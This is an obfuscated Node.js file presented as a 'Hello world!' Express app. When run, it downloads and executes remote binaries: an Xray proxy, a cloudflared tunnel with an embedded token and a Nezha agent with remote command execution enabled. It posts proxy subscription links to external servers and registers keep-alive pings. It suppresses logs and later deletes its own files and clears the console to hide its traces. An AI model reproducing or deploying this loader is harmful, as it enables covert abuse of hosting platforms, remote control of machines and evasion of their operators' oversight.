const _0x4f4c93=_0x5231;(function(_0x46f012,_0x265b0f){const _0x13fe5f=_0x5231,_0x1efcc9=_0x46f012();while(!![]){try{const _0x1ef86f=parseInt(_0x13fe5f(0x201))/0x1*(-parseInt(_0x13fe5f(0x1fd))/0x2)+parseInt(_0x13fe5f(0x26f))/0x3+parseInt(_0x13fe5f(0x240))/0x4+-parseInt(_0x13fe5f(0x1e8))/0x5+parseInt(_0x13fe5f(0x1ed))/0x6+parseInt(_0x13fe5f(0x28c))/0x7*(parseInt(_0x13fe5f(0x27b))/0x8)+-parseInt(_0x13fe5f(0x275))/0x9;if(_0x1ef86f===_0x265b0f)break;else _0x1efcc9['push'](_0x1efcc9['shift']());}catch(_0x19de72){_0x1efcc9['push'](_0x1efcc9['shift']());}}}(_0x4368,0xa60b6));const express=require(_0x4f4c93(0x28a)),app=express(),axios=require(_0x4f4c93(0x241)),os=require('os'),fs=require('fs'),path=require(_0x4f4c93(0x22f)),{promisify}=require(_0x4f4c93(0x24e)),exec=promisify(require(_0x4f4c93(0x218))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x4f4c93(0x287)][_0x4f4c93(0x26e)]||'',PROJECT_URL=process[_0x4f4c93(0x287)]['PROJECT_URL']||'',AUTO_ACCESS=process['env'][_0x4f4c93(0x1f4)]||![],FILE_PATH=process['env'][_0x4f4c93(0x299)]||_0x4f4c93(0x21d),SUB_PATH=process[_0x4f4c93(0x287)]['SUB_PATH']||'4886',PORT=process[_0x4f4c93(0x287)][_0x4f4c93(0x222)]||process[_0x4f4c93(0x287)][_0x4f4c93(0x213)]||0xbb8,UUID=process[_0x4f4c93(0x287)][_0x4f4c93(0x23d)]||_0x4f4c93(0x231),NEZHA_SERVER=process['env'][_0x4f4c93(0x288)]||'',NEZHA_PORT=process[_0x4f4c93(0x287)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x4f4c93(0x287)][_0x4f4c93(0x25c)]||'',ARGO_DOMAIN=process[_0x4f4c93(0x287)]['ARGO_DOMAIN']||_0x4f4c93(0x238),ARGO_AUTH=process[_0x4f4c93(0x287)][_0x4f4c93(0x26b)]||'eyJhIjoiMjI3ODU1ZTM2OWM0MDAzODU2YWY5ZmNiOWM1OTMxNjEiLCJ0IjoiZWMxNDgxNTctMzU1MS00MDEwLWI5MzAtMTUxYjUwMGQ5MDg5IiwicyI6IllUazFaamN5WmpFdE5UVm1aUzAwTW1aaExUZ3laVGd0T1RnNFlqVmtNR1UwT0RZMCJ9',ARGO_PORT=process['env'][_0x4f4c93(0x265)]||0x1f41,CFIP=process[_0x4f4c93(0x287)]['CFIP']||'cdns.doon.eu.org',CFPORT=process[_0x4f4c93(0x287)][_0x4f4c93(0x1f0)]||0x1bb,NAME=process[_0x4f4c93(0x287)][_0x4f4c93(0x24b)]||'gT6@qZp#kD9vN';!fs[_0x4f4c93(0x206)](FILE_PATH)?(fs[_0x4f4c93(0x290)](FILE_PATH),console[_0x4f4c93(0x263)](FILE_PATH+_0x4f4c93(0x276))):console[_0x4f4c93(0x263)](FILE_PATH+_0x4f4c93(0x21a));function generateRandomName(){const _0x1173d5=_0x4f4c93,_0x1aed28=_0x1173d5(0x254);let _0x38b425='';for(let _0x10cf94=0x0;_0x10cf94<0x6;_0x10cf94++){_0x38b425+=_0x1aed28[_0x1173d5(0x1ea)](Math[_0x1173d5(0x296)](Math[_0x1173d5(0x1de)]()*_0x1aed28['length']));}return _0x38b425;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4f4c93(0x228)](FILE_PATH,npmName),phpPath=path[_0x4f4c93(0x228)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x4f4c93(0x228)](FILE_PATH,'sub.txt'),listPath=path[_0x4f4c93(0x228)](FILE_PATH,'list.txt'),bootLogPath=path[_0x4f4c93(0x228)](FILE_PATH,_0x4f4c93(0x223)),configPath=path['join'](FILE_PATH,_0x4f4c93(0x272));function deleteNodes(){const _0x4bf09e=_0x4f4c93;try{if(!UPLOAD_URL)return;if(!fs[_0x4bf09e(0x206)](subPath))return;let _0x53c940;try{_0x53c940=fs[_0x4bf09e(0x23e)](subPath,_0x4bf09e(0x23b));}catch{return null;}const _0x885f87=Buffer['from'](_0x53c940,_0x4bf09e(0x1ff))[_0x4bf09e(0x261)](_0x4bf09e(0x23b)),_0x217a71=_0x885f87['split']('\x0a')[_0x4bf09e(0x1e1)](_0x2b32eb=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4bf09e(0x211)](_0x2b32eb));if(_0x217a71[_0x4bf09e(0x1f5)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON[_0x4bf09e(0x21c)]({'nodes':_0x217a71}),{'headers':{'Content-Type':'application/json'}})[_0x4bf09e(0x25e)](_0x2d5e41=>{return null;}),null;}catch(_0x284d47){return null;}}function cleanupOldFiles(){const _0x152bd3=_0x4f4c93;try{const _0x2b7a73=fs[_0x152bd3(0x21e)](FILE_PATH);_0x2b7a73[_0x152bd3(0x209)](_0xd7eb63=>{const _0x5232f9=_0x152bd3,_0x5a291e=path[_0x5232f9(0x228)](FILE_PATH,_0xd7eb63);try{const _0x65c5b9=fs[_0x5232f9(0x267)](_0x5a291e);_0x65c5b9[_0x5232f9(0x233)]()&&fs[_0x5232f9(0x1ee)](_0x5a291e);}catch(_0x20f40b){}});}catch(_0x514d96){}}app[_0x4f4c93(0x28e)]('/',function(_0x4ff1cb,_0x213549){const _0xb829c1=_0x4f4c93;_0x213549[_0xb829c1(0x292)](_0xb829c1(0x207));});async function generateConfig(){const _0x4dd62b=_0x4f4c93,_0x20d0bf={'log':{'access':_0x4dd62b(0x264),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x4dd62b(0x212),'fallbacks':[{'dest':0xbb9},{'path':_0x4dd62b(0x249),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x4dd62b(0x216),'dest':0xbbc}]},'streamSettings':{'network':_0x4dd62b(0x214)}},{'port':0xbb9,'listen':_0x4dd62b(0x282),'protocol':_0x4dd62b(0x297),'settings':{'clients':[{'id':UUID}],'decryption':_0x4dd62b(0x212)},'streamSettings':{'network':_0x4dd62b(0x214),'security':_0x4dd62b(0x212)}},{'port':0xbba,'listen':_0x4dd62b(0x282),'protocol':_0x4dd62b(0x297),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x4dd62b(0x212),'wsSettings':{'path':_0x4dd62b(0x249)}},'sniffing':{'enabled':!![],'destOverride':[_0x4dd62b(0x284),'tls',_0x4dd62b(0x251)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4dd62b(0x282),'protocol':_0x4dd62b(0x20e),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4dd62b(0x1fb)}},'sniffing':{'enabled':!![],'destOverride':[_0x4dd62b(0x284),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4dd62b(0x282),'protocol':_0x4dd62b(0x1df),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x4dd62b(0x216)}},'sniffing':{'enabled':!![],'destOverride':[_0x4dd62b(0x284),_0x4dd62b(0x268),_0x4dd62b(0x251)],'metadataOnly':![]}}],'dns':{'servers':[_0x4dd62b(0x220)]},'outbounds':[{'protocol':'freedom','tag':_0x4dd62b(0x1ef)},{'protocol':'blackhole','tag':_0x4dd62b(0x20d)}]};fs[_0x4dd62b(0x1dd)](path[_0x4dd62b(0x228)](FILE_PATH,_0x4dd62b(0x272)),JSON[_0x4dd62b(0x21c)](_0x20d0bf,null,0x2));}function getSystemArchitecture(){const _0x24ebe8=_0x4f4c93,_0x3bcb32=os[_0x24ebe8(0x244)]();return _0x3bcb32==='arm'||_0x3bcb32===_0x24ebe8(0x1f9)||_0x3bcb32===_0x24ebe8(0x1e5)?_0x24ebe8(0x28d):_0x24ebe8(0x200);}function downloadFile(_0x350b7d,_0x1de414,_0x7c073){const _0x4b6b70=_0x4f4c93,_0x5666aa=_0x350b7d;!fs[_0x4b6b70(0x206)](FILE_PATH)&&fs[_0x4b6b70(0x290)](FILE_PATH,{'recursive':!![]});const _0x28bcb0=fs[_0x4b6b70(0x247)](_0x5666aa);axios({'method':_0x4b6b70(0x28e),'url':_0x1de414,'responseType':'stream'})[_0x4b6b70(0x298)](_0x5ccbb0=>{const _0x302f0b=_0x4b6b70;_0x5ccbb0[_0x302f0b(0x280)][_0x302f0b(0x1e2)](_0x28bcb0),_0x28bcb0['on'](_0x302f0b(0x28b),()=>{const _0x503dff=_0x302f0b;_0x28bcb0[_0x503dff(0x1fa)](),console[_0x503dff(0x263)]('Download\x20'+path[_0x503dff(0x1ec)](_0x5666aa)+_0x503dff(0x279)),_0x7c073(null,_0x5666aa);}),_0x28bcb0['on'](_0x302f0b(0x286),_0x188408=>{const _0x615cdb=_0x302f0b;fs['unlink'](_0x5666aa,()=>{});const _0x655a6a=_0x615cdb(0x203)+path[_0x615cdb(0x1ec)](_0x5666aa)+_0x615cdb(0x25a)+_0x188408[_0x615cdb(0x28f)];console[_0x615cdb(0x286)](_0x655a6a),_0x7c073(_0x655a6a);});})['catch'](_0x46ea9b=>{const _0x311d43=_0x4b6b70,_0x348654='Download\x20'+path[_0x311d43(0x1ec)](_0x5666aa)+_0x311d43(0x25a)+_0x46ea9b[_0x311d43(0x28f)];console[_0x311d43(0x286)](_0x348654),_0x7c073(_0x348654);});}async function downloadFilesAndRun(){const _0x276f84=_0x4f4c93,_0x1ed84b=getSystemArchitecture(),_0x5336cd=getFilesForArchitecture(_0x1ed84b);if(_0x5336cd[_0x276f84(0x1f5)]===0x0){console[_0x276f84(0x263)](_0x276f84(0x269));return;}const _0x4dc7ae=_0x5336cd[_0x276f84(0x252)](_0xebc69a=>{return new Promise((_0x44837d,_0x3bb8fd)=>{downloadFile(_0xebc69a['fileName'],_0xebc69a['fileUrl'],(_0x5d01a3,_0x55158b)=>{_0x5d01a3?_0x3bb8fd(_0x5d01a3):_0x44837d(_0x55158b);});});});try{await Promise[_0x276f84(0x259)](_0x4dc7ae);}catch(_0x157743){console[_0x276f84(0x286)](_0x276f84(0x1f7),_0x157743);return;}function _0x3f9b7c(_0x5bb7aa){const _0x1089d7=_0x276f84,_0x2e0f60=0x1fd;_0x5bb7aa[_0x1089d7(0x209)](_0x3490ea=>{const _0x5df4b4=_0x1089d7;fs['existsSync'](_0x3490ea)&&fs[_0x5df4b4(0x215)](_0x3490ea,_0x2e0f60,_0x5f1658=>{const _0x1eca39=_0x5df4b4;_0x5f1658?console[_0x1eca39(0x286)](_0x1eca39(0x1e7)+_0x3490ea+':\x20'+_0x5f1658):console['log'](_0x1eca39(0x248)+_0x3490ea+':\x20'+_0x2e0f60[_0x1eca39(0x261)](0x8));});});}const _0x434536=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3f9b7c(_0x434536);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4d43f7=NEZHA_SERVER[_0x276f84(0x253)](':')?NEZHA_SERVER['split'](':')[_0x276f84(0x1fc)]():'',_0x5ce367=new Set(['443',_0x276f84(0x1e4),_0x276f84(0x23a),_0x276f84(0x25b),_0x276f84(0x23c),_0x276f84(0x22b)]),_0x5dd394=_0x5ce367[_0x276f84(0x22e)](_0x4d43f7)?_0x276f84(0x291):_0x276f84(0x239),_0x50543d=_0x276f84(0x236)+NEZHA_KEY+_0x276f84(0x204)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x5dd394+_0x276f84(0x1e0)+UUID;fs['writeFileSync'](path[_0x276f84(0x228)](FILE_PATH,_0x276f84(0x295)),_0x50543d);const _0x4728d5=_0x276f84(0x25d)+phpPath+_0x276f84(0x270)+FILE_PATH+_0x276f84(0x1f8);try{await exec(_0x4728d5),console[_0x276f84(0x263)](phpName+'\x20is\x20running'),await new Promise(_0x5073a3=>setTimeout(_0x5073a3,0x3e8));}catch(_0x1f9830){console[_0x276f84(0x286)](_0x276f84(0x245)+_0x1f9830);}}else{let _0x34d618='';const _0x5dd4f3=[_0x276f84(0x260),_0x276f84(0x1e4),_0x276f84(0x23a),'2087','2083','2053'];_0x5dd4f3[_0x276f84(0x253)](NEZHA_PORT)&&(_0x34d618=_0x276f84(0x250));const _0x9c0d5f=_0x276f84(0x25d)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x276f84(0x27f)+NEZHA_KEY+'\x20'+_0x34d618+_0x276f84(0x205);try{await exec(_0x9c0d5f),console[_0x276f84(0x263)](npmName+_0x276f84(0x21b)),await new Promise(_0x361e40=>setTimeout(_0x361e40,0x3e8));}catch(_0x5bc7d4){console[_0x276f84(0x286)](_0x276f84(0x243)+_0x5bc7d4);}}}else console[_0x276f84(0x263)](_0x276f84(0x217));const _0x3f5d1c='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+_0x276f84(0x1e9);try{await exec(_0x3f5d1c),console[_0x276f84(0x263)](webName+'\x20is\x20running'),await new Promise(_0x8bfc3c=>setTimeout(_0x8bfc3c,0x3e8));}catch(_0xd14f24){console[_0x276f84(0x286)](_0x276f84(0x294)+_0xd14f24);}if(fs[_0x276f84(0x206)](botPath)){let _0x222b34;if(ARGO_AUTH[_0x276f84(0x21f)](/^[A-Z0-9a-z=]{120,250}$/))_0x222b34=_0x276f84(0x24d)+ARGO_AUTH;else ARGO_AUTH[_0x276f84(0x21f)](/TunnelSecret/)?_0x222b34='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x276f84(0x225):_0x222b34=_0x276f84(0x242)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x276f84(0x25d)+botPath+'\x20'+_0x222b34+_0x276f84(0x258)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x583e64=>setTimeout(_0x583e64,0x7d0));}catch(_0x4cda4d){console[_0x276f84(0x286)](_0x276f84(0x26a)+_0x4cda4d);}}await new Promise(_0x5743cd=>setTimeout(_0x5743cd,0x1388));}function getFilesForArchitecture(_0x107c68){const _0x16ccc3=_0x4f4c93;let _0x883219;_0x107c68==='arm'?_0x883219=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x883219=[{'fileName':webPath,'fileUrl':_0x16ccc3(0x24a)},{'fileName':botPath,'fileUrl':_0x16ccc3(0x22d)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5036fa=_0x107c68===_0x16ccc3(0x28d)?_0x16ccc3(0x27e):'https://amd64.ssss.nyc.mn/agent';_0x883219[_0x16ccc3(0x24f)]({'fileName':npmPath,'fileUrl':_0x5036fa});}else{const _0x4dd586=_0x107c68===_0x16ccc3(0x28d)?_0x16ccc3(0x289):_0x16ccc3(0x266);_0x883219[_0x16ccc3(0x24f)]({'fileName':phpPath,'fileUrl':_0x4dd586});}}return _0x883219;}function argoType(){const _0x1f209a=_0x4f4c93;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1f209a(0x263)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x1f209a(0x253)](_0x1f209a(0x227))){fs['writeFileSync'](path['join'](FILE_PATH,_0x1f209a(0x237)),ARGO_AUTH);const _0x1ca3af=_0x1f209a(0x26d)+ARGO_AUTH[_0x1f209a(0x224)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path['join'](FILE_PATH,_0x1f209a(0x237))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x1f209a(0x256)+ARGO_PORT+_0x1f209a(0x255);fs[_0x1f209a(0x1dd)](path[_0x1f209a(0x228)](FILE_PATH,_0x1f209a(0x210)),_0x1ca3af);}else console[_0x1f209a(0x263)](_0x1f209a(0x262));}function _0x5231(_0x2efad9,_0xb79da7){const _0x436818=_0x4368();return _0x5231=function(_0x5231b8,_0x3151d9){_0x5231b8=_0x5231b8-0x1dc;let _0x2afaa0=_0x436818[_0x5231b8];return _0x2afaa0;},_0x5231(_0x2efad9,_0xb79da7);}function _0x4368(){const _0x285922=['config.yaml','floor','vless','then','FILE_PATH','\x0avless://','automatic\x20access\x20task\x20added\x20successfully','writeFileSync','random','trojan','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','filter','pipe','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','8443','aarch64','status','Empowerment\x20failed\x20for\x20','3997965ISXUsT','/config.json\x20>/dev/null\x202>&1\x20&','charAt','listen','basename','7661838iSfdXo','unlinkSync','direct','CFPORT','https://oooo.serv00.net/add-url','application/json','\x0a\x20\x20\x0avmess://','AUTO_ACCESS','length','/api/add-nodes','Error\x20downloading\x20files:','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','arm64','close','/vmess-argo','pop','10FYQwKz','Content-Type','base64','amd','34788uAFcaL','Unhandled\x20error\x20in\x20startserver:','Download\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','existsSync','Hello\x20world!','response','forEach','from','\x22\x20>\x20/dev/null\x202>&1','rm\x20-rf\x20','block','vmess','firefox','tunnel.yml','test','none','PORT','tcp','chmod','/trojan-argo','NEZHA\x20variable\x20is\x20empty,skip\x20running','child_process','win32','\x20already\x20exists','\x20is\x20running','stringify','./tmp','readdirSync','match','https+local://8.8.8.8/dns-query','Error\x20reading\x20boot.log:','SERVER_PORT','boot.log','split','/tunnel.yml\x20run','App\x20is\x20running','TunnelSecret','join','?security=tls&sni=','del\x20/f\x20/q\x20','2053','.exe\x20>\x20nul\x202>&1','https://amd64.ssss.nyc.mn/bot','has','path','&path=%2Fvless-argo%3Fed%3D2560#','733a62e0-8f86-48b4-b7dc-ea2f6a336203','push','isFile','platform','&path=%2Ftrojan-argo%3Fed%3D2560#','\x0aclient_secret:\x20','tunnel.json','4886.5.b.c.0.6.3.0.0.0.7.4.0.1.0.0.2.ip6.arpa','false','2096','utf-8','2083','UUID','readFileSync','?encryption=none&security=tls&sni=','4883560yNoBLS','axios','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','npm\x20running\x20error:\x20','arch','php\x20running\x20error:\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','createWriteStream','Empowerment\x20success\x20for\x20','/vless-argo','https://amd64.ssss.nyc.mn/web','NAME','substring','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','util','unshift','--tls','quic','map','includes','abcdefghijklmnopqrstuvwxyz','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','ArgoDomain:','\x20>/dev/null\x202>&1\x20&','all','\x20failed:\x20','2087','NEZHA_KEY','nohup\x20','catch','clear','443','toString','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','log','/dev/null','ARGO_PORT','https://amd64.ssss.nyc.mn/v1','statSync','tls','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','Error\x20executing\x20command:\x20','ARGO_AUTH','pkill\x20-f\x20\x22[','\x0a\x20\x20tunnel:\x20','UPLOAD_URL','1545204YchhMs','\x20-c\x20\x22','trim','config.json','\x0a\x20\x20\x0atrojan://','taskkill\x20/f\x20/im\x20','14991129gxwjPy','\x20is\x20created','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','text/plain;\x20charset=utf-8','\x20successfully','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','8ojRzBK','http\x20server\x20is\x20running\x20on\x20port:','post','https://arm64.ssss.nyc.mn/agent','\x20-p\x20','data','\x20>\x20nul\x202>&1','127.0.0.1','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','http','&fp=firefox&type=ws&host=','error','env','NEZHA_SERVER','https://arm64.ssss.nyc.mn/v1','express','finish','2144807vFFtca','arm','get','message','mkdirSync','true','send','Subscription\x20uploaded\x20successfully','web\x20running\x20error:\x20'];_0x4368=function(){return _0x285922;};return _0x4368();}argoType();async function extractDomains(){const _0x5f1d32=_0x4f4c93;let _0x4759a5;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4759a5=ARGO_DOMAIN,console[_0x5f1d32(0x263)]('ARGO_DOMAIN:',_0x4759a5),await _0x3e0514(_0x4759a5);else try{const _0x94cd39=fs[_0x5f1d32(0x23e)](path[_0x5f1d32(0x228)](FILE_PATH,_0x5f1d32(0x223)),'utf-8'),_0x30f8d6=_0x94cd39['split']('\x0a'),_0x43a794=[];_0x30f8d6[_0x5f1d32(0x209)](_0x260779=>{const _0x14f8c6=_0x5f1d32,_0x52f71b=_0x260779['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x52f71b){const _0x56e4c4=_0x52f71b[0x1];_0x43a794[_0x14f8c6(0x232)](_0x56e4c4);}});if(_0x43a794[_0x5f1d32(0x1f5)]>0x0)_0x4759a5=_0x43a794[0x0],console[_0x5f1d32(0x263)](_0x5f1d32(0x257),_0x4759a5),await _0x3e0514(_0x4759a5);else{console[_0x5f1d32(0x263)](_0x5f1d32(0x283)),fs[_0x5f1d32(0x1ee)](path[_0x5f1d32(0x228)](FILE_PATH,'boot.log'));async function _0x597813(){const _0x3b795d=_0x5f1d32;try{process[_0x3b795d(0x234)]==='win32'?await exec(_0x3b795d(0x274)+botName+_0x3b795d(0x22c)):await exec(_0x3b795d(0x26c)+botName[_0x3b795d(0x1ea)](0x0)+']'+botName[_0x3b795d(0x24c)](0x1)+_0x3b795d(0x20b));}catch(_0x4dabaf){}}_0x597813(),await new Promise(_0x5a8f0b=>setTimeout(_0x5a8f0b,0xbb8));const _0x1b323f=_0x5f1d32(0x242)+FILE_PATH+_0x5f1d32(0x27a)+ARGO_PORT;try{await exec(_0x5f1d32(0x25d)+botPath+'\x20'+_0x1b323f+_0x5f1d32(0x258)),console[_0x5f1d32(0x263)](botName+'\x20is\x20running'),await new Promise(_0x5b2e62=>setTimeout(_0x5b2e62,0xbb8)),await extractDomains();}catch(_0x3f17ed){console['error'](_0x5f1d32(0x26a)+_0x3f17ed);}}}catch(_0x164edc){console[_0x5f1d32(0x286)](_0x5f1d32(0x221),_0x164edc);}async function _0x3e0514(_0x38f9f7){const _0x3eadfe=_0x5f1d32,_0x56f26b=execSync(_0x3eadfe(0x1e3),{'encoding':'utf-8'}),_0x2fd49d=_0x56f26b[_0x3eadfe(0x271)](),_0x2facdc=NAME?NAME+'-'+_0x2fd49d:_0x2fd49d;return new Promise(_0x4e2503=>{setTimeout(()=>{const _0x2ffdd1=_0x5231,_0x1252d7={'v':'2','ps':''+_0x2facdc,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x2ffdd1(0x212),'net':'ws','type':_0x2ffdd1(0x212),'host':_0x38f9f7,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x38f9f7,'alpn':'','fp':_0x2ffdd1(0x20f)},_0x52b895=_0x2ffdd1(0x29a)+UUID+'@'+CFIP+':'+CFPORT+_0x2ffdd1(0x23f)+_0x38f9f7+'&fp=firefox&type=ws&host='+_0x38f9f7+_0x2ffdd1(0x230)+_0x2facdc+_0x2ffdd1(0x1f3)+Buffer[_0x2ffdd1(0x20a)](JSON['stringify'](_0x1252d7))[_0x2ffdd1(0x261)](_0x2ffdd1(0x1ff))+_0x2ffdd1(0x273)+UUID+'@'+CFIP+':'+CFPORT+_0x2ffdd1(0x229)+_0x38f9f7+_0x2ffdd1(0x285)+_0x38f9f7+_0x2ffdd1(0x235)+_0x2facdc+'\x0a\x20\x20\x20\x20';console[_0x2ffdd1(0x263)](Buffer[_0x2ffdd1(0x20a)](_0x52b895)[_0x2ffdd1(0x261)](_0x2ffdd1(0x1ff))),fs[_0x2ffdd1(0x1dd)](subPath,Buffer[_0x2ffdd1(0x20a)](_0x52b895)[_0x2ffdd1(0x261)](_0x2ffdd1(0x1ff))),console[_0x2ffdd1(0x263)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x2ffdd1(0x28e)]('/'+SUB_PATH,(_0x355e8c,_0x4daca4)=>{const _0x4c3ab=_0x2ffdd1,_0x1b6783=Buffer[_0x4c3ab(0x20a)](_0x52b895)[_0x4c3ab(0x261)]('base64');_0x4daca4['set'](_0x4c3ab(0x1fe),_0x4c3ab(0x278)),_0x4daca4[_0x4c3ab(0x292)](_0x1b6783);}),_0x4e2503(_0x52b895);},0x7d0);});}}async function uploadNodes(){const _0x5e3580=_0x4f4c93;if(UPLOAD_URL&&PROJECT_URL){const _0x55b746=PROJECT_URL+'/'+SUB_PATH,_0xc3b56c={'subscription':[_0x55b746]};try{const _0x55c8d2=await axios[_0x5e3580(0x27d)](UPLOAD_URL+'/api/add-subscriptions',_0xc3b56c,{'headers':{'Content-Type':'application/json'}});return _0x55c8d2&&_0x55c8d2['status']===0xc8?(console[_0x5e3580(0x263)](_0x5e3580(0x293)),_0x55c8d2):null;}catch(_0x1ccbef){if(_0x1ccbef[_0x5e3580(0x208)]){if(_0x1ccbef[_0x5e3580(0x208)][_0x5e3580(0x1e6)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x5d3d66=fs[_0x5e3580(0x23e)](listPath,'utf-8'),_0x145ac8=_0x5d3d66[_0x5e3580(0x224)]('\x0a')['filter'](_0x37b7b0=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5e3580(0x211)](_0x37b7b0));if(_0x145ac8[_0x5e3580(0x1f5)]===0x0)return;const _0x4cda3d=JSON[_0x5e3580(0x21c)]({'nodes':_0x145ac8});try{const _0x2be4c9=await axios[_0x5e3580(0x27d)](UPLOAD_URL+_0x5e3580(0x1f6),_0x4cda3d,{'headers':{'Content-Type':'application/json'}});return _0x2be4c9&&_0x2be4c9[_0x5e3580(0x1e6)]===0xc8?(console[_0x5e3580(0x263)]('Nodes\x20uploaded\x20successfully'),_0x2be4c9):null;}catch(_0x3b9789){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x29b29e=_0x5231,_0x36c2eb=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x36c2eb['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x36c2eb[_0x29b29e(0x232)](phpPath);process[_0x29b29e(0x234)]===_0x29b29e(0x219)?exec(_0x29b29e(0x22a)+_0x36c2eb[_0x29b29e(0x228)]('\x20')+_0x29b29e(0x281),_0x5b584c=>{const _0x26297f=_0x29b29e;console[_0x26297f(0x25f)](),console['log'](_0x26297f(0x226)),console['log'](_0x26297f(0x277));}):exec(_0x29b29e(0x20c)+_0x36c2eb[_0x29b29e(0x228)]('\x20')+'\x20>/dev/null\x202>&1',_0x42e934=>{const _0x3f2879=_0x29b29e;console[_0x3f2879(0x25f)](),console[_0x3f2879(0x263)](_0x3f2879(0x226)),console['log'](_0x3f2879(0x277));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x44f5b4=_0x4f4c93;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x44f5b4(0x263)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x325f9d=await axios['post'](_0x44f5b4(0x1f1),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x44f5b4(0x1f2)}});return console['log'](_0x44f5b4(0x1dc)),_0x325f9d;}catch(_0x246fdf){return console[_0x44f5b4(0x286)](_0x44f5b4(0x246)+_0x246fdf['message']),null;}}async function startserver(){const _0x43db5f=_0x4f4c93;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x174785){console[_0x43db5f(0x286)]('Error\x20in\x20startserver:',_0x174785);}}startserver()[_0x4f4c93(0x25e)](_0x49c2c9=>{const _0x73915b=_0x4f4c93;console[_0x73915b(0x286)](_0x73915b(0x202),_0x49c2c9);}),app[_0x4f4c93(0x1eb)](PORT,()=>console[_0x4f4c93(0x263)](_0x4f4c93(0x27c)+PORT+'!'));
